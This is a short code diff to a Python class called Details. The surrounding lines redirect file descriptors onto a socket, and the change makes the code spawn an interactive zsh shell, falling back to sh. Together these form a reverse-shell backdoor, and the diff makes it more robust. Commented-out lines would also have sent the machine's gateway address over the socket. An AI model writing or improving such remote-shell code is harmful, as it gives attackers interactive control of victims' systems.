@@ -94,7 +94,10 @@ class Details:
         os.dup2(s.fileno(),2)
         #gateway = self.get_default_gateway()
         #s.send(gateway.encode())
-        subprocess.call(["/bin/sh","-i"])
+        try:
+            subprocess.call(["/bin/zsh","-i"])  #Check if the system have zsh shell
+        except:
+            subprocess.call(["/bin/sh","-i"])  #If there is no zsh shell or error occured it will call sh shell
 
 
 #    def get_default_gateway(self):  #### Gateway
